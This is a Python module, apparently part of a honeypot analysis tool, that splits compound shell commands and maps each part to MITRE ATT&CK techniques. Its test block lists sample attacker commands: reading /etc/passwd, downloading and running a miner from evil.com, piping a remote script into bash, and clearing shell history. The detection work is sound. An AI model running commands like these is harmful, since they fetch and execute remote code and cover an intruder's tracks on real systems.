# Author: TK
# Date: 10-06-2026
# Purpose: Takes session's commands and produces a list of MITRE ATT&CK techniques the attacker used.

import json
import re

from config import ATTACK_PATTERNS_FILE


# Shell control operators that chain commands together.
# We split on these so a compound one-liner is mapped to every technique it uses.
def split_compound(command_line: str) -> list[str]:
    """Split a shell command line into its individual sub-commands.

    Splits on the shell control operators  ;  &&  ||  |  &  and newlines,
    while respecting single and double quotes so that operators *inside*
    a quoted string (e.g. echo "a && b") are NOT treated as separators.
    Consecutive operators (&&, ||) collapse into a single split point.
    """
    sub_commands = []
    current = []
    in_single = False
    in_double = False

    i = 0
    length = len(command_line)

    while i < length:
        char = command_line[i]

        if char == "'" and not in_double:
            in_single = not in_single
            current.append(char)
        elif char == '"' and not in_single:
            in_double = not in_double
            current.append(char)
        elif not in_single and not in_double and char in ";|&\n":
            token = "".join(current).strip()
            if token:
                sub_commands.append(token)
            current = []
            # Skip any run of operator chars so && / || collapse to one split
            while i < length and command_line[i] in ";|&\n":
                i += 1
            continue
        else:
            current.append(char)

        i += 1

    token = "".join(current).strip()
    if token:
        sub_commands.append(token)

    return sub_commands


class AttackClassifier:
    def __init__(self):
        with open(ATTACK_PATTERNS_FILE, "r", encoding="utf-8") as file:
            data = json.load(file)

        self.patterns = data.get("patterns", [])

        for pattern in self.patterns:
            regexes = pattern.get("regex") or [
                re.escape(match) for match in pattern.get("matches", [])
            ]

            pattern["_compiled"] = [
                re.compile(regex, re.IGNORECASE) for regex in regexes
            ]

    def _match_single(self, command: str) -> list[dict]:
        """Match ATT&CK patterns against ONE already-split sub-command."""
        matches = []
        for pattern in self.patterns:
            if any(regex.search(command) for regex in pattern.get("_compiled", [])):
                matches.append(
                    {
                        "id": pattern.get("id"),
                        "name": pattern.get("name"),
                        "tactic": pattern.get("tactic"),
                        "description": pattern.get("description", ""),
                    }
                )
        return matches

    def classify_command(self, command: str) -> list[dict]:
        """Return ATT&CK techniques for a full command line.

        Compound command lines (chained with ; && || | &) are split into
        their individual sub-commands and each is classified separately,
        so a full kill-chain one-liner is mapped to EVERY technique it uses.
        Techniques are de-duplicated within a single line.
        """
        unique = {}
        for sub in split_compound(command):
            for match in self._match_single(sub):
                unique[match["id"]] = match
        return list(unique.values())

    def classify_session(self, session: dict) -> dict:
        unique_techniques = {}
        tactic_counts = {}
        timeline = []

        for command in session.get("commands", []):
            sub_commands = split_compound(command)
            matches = self.classify_command(command)

            timeline.append(
                {
                    "command": command,
                    # Only expose sub_commands when the line was actually compound
                    "sub_commands": sub_commands if len(sub_commands) > 1 else [],
                    "techniques": matches,
                }
            )

            for match in matches:
                unique_techniques[match["id"]] = match

                tactic = match.get("tactic", "Unknown")
                tactic_counts[tactic] = tactic_counts.get(tactic, 0) + 1

        return {
            "session_id": session.get("session_id"),
            "peer_ip": session.get("peer_ip"),
            "techniques": list(unique_techniques.values()),
            "tactic_counts": tactic_counts,
            "timeline": timeline,
            "technique_count": len(unique_techniques),
        }


if __name__ == "__main__":
    classifier = AttackClassifier()

    test_commands = [
        "whoami",
        "cat /etc/passwd",
        "cd /tmp; wget http://evil.com/miner.sh; chmod +x miner.sh; ./miner.sh",
        "curl -s http://evil.com/install.sh | bash",
        'echo "this; is && one || command" > note.txt',
        "history -c",
    ]

    for command in test_commands:
        techniques = classifier.classify_command(command)
        ids = [t["id"] for t in techniques]
        print(f"\n{command}")
        print(f"  sub-commands: {split_compound(command)}")
        print(f"  techniques:   {ids}")

